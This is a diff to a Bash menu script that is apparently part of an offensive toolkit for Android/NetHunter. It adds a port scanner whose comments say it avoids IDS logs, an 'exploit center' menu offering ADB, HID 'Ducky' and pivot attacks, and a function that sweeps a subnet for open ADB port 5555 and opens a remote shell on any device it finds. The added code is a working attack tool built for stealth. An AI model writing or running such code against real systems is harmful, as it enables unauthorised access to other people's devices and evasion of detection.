@@ -359,6 +359,86 @@ run_heuristic_scanner_v2() {
     pause
 }
 
+run_heuristic_scanner_v2() {
+    clear
+    echo -e "${B}--------------------------------------------------${NC}"
+    echo -e "${B}---      HEURISTIC STEALTH SCANNER v2.0        ---${NC}"
+    echo -e "${B}--------------------------------------------------${NC}"
+    
+    read -p "Целевой IP/Range: " TARGET
+    [ -z "$TARGET" ] && return
+
+    echo -e "${Y}[*] Запуск бесшумного анализа (Native Bash Stack)...${NC}"
+    
+    # Эвристика: проверяем только критические порты через системные дескрипторы
+    # Это не оставляет следов nmap в логах IDS
+    local ports=(21 22 23 80 443 445 3389 5555 8080)
+    for port in "${ports[@]}"; do
+        (
+            if timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null; then
+                echo -e "${G}[+] PORT $port OPEN${NC} -> $(timeout 1 openssl s_client -connect $TARGET:$port 2>/dev/null | grep "subject=" || echo "Service Detected")"
+            fi
+        ) &
+    done
+    wait
+    echo -e "${G}[+] Эвристический анализ завершен.${NC}"
+    pause
+}
+
+
+run_prime_exploiter_v4() {
+    clear
+    echo -e "${R}--------------------------------------------------${NC}"
+    echo -e "${R}---      PRIME HEURISTIC FRAMEWORK (PHE)       ---${NC}"
+    echo -e "${R}--------------------------------------------------${NC}"
+    
+    # Сохраняем логику выбора, но меняем наполнение на сверхбыстрое
+    local phe_names="ADB_Silent_Connect HID_Ducky_Attack Network_Pivot Back"
+    local phe_funcs="phe_core_adb phe_core_hid phe_core_pivot return"
+    
+    echo -e "${G}[SYSTEM] Mode: NetHunter Native / Zero-Day Heuristic${NC}"
+    echo -e "${W}--------------------------------------------------${NC}"
+
+    prime_dynamic_controller "PHE EXPLOIT CENTER" "$phe_names" "$phe_funcs"
+}
+
+# Внутренняя логика для ADB (без Python, только бинарник и bash)
+phe_core_adb() {
+    echo -e "${Y}[*] Scanning for ADB targets...${NC}"
+    local target_ip
+    # Быстрый поиск открытого порта 5555 в подсети без nmap
+    for i in {1..254}; do
+        timeout 0.1 bash -c "echo >/dev/tcp/${CURRENT_IP%.*}.$i/5555" 2>/dev/null && \
+        echo -e "${G}[+] Found ADB:${NC} ${CURRENT_IP%.*}.$i" &
+    done
+    wait
+    read -p "Target IP: " target_ip
+    [ -z "$target_ip" ] && return
+    
+    adb connect "$target_ip:5555"
+    adb -s "$target_ip:5555" shell
+}
+
+run_repair() {
+    clear
+    echo -e "${Y}[*] Запуск протокола самовосстановления...${NC}"
+    
+    # Проверка и фикс прав на все скрипты в /root/
+    chmod +x /root/*.sh 2>/dev/null
+    chmod +x /root/*.py 2>/dev/null
+    
+    # Очистка зомби-процессов tshark или python
+    killall -9 tshark python3 2>/dev/null
+    
+    # Проверка DNS и интерфейсов
+    if [ "$CURRENT_IP" == "127.0.0.1" ]; then
+        echo -e "${R}[!] Network Issue: Check wlan0/rmnet status${NC}"
+    else
+        echo -e "${G}[+] System Health: OK (IP: $CURRENT_IP)${NC}"
+    fi
+    sleep 2
+}
+
 
 
 
